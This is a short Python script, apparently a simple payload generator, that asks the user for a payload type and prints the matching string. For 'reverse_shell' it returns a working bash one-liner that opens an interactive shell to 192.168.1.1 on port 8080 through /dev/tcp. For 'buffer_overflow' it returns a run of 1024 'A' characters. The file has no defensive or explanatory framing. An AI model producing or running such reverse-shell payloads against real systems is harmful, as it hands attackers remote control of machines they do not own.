def generate_payload(payload_type):
    if payload_type == "reverse_shell":
        return "bash -i >& /dev/tcp/192.168.1.1/8080 0>&1"
    elif payload_type == "buffer_overflow":
        return "A" * 1024
    else:
        return "Unknown payload type"

if __name__ == "__main__":
    payload_type = input("Enter payload type (reverse_shell/buffer_overflow): ")
    payload = generate_payload(payload_type)
    print(f"Generated payload: {payload}")
